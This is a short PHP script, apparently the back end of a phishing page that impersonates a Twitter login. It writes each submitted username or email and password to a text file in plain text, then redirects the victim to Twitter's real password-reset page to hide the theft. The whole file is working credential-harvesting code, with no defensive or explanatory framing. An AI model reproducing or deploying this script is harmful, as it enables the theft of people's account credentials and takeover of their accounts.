<?php

file_put_contents("usernames.txt", "Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
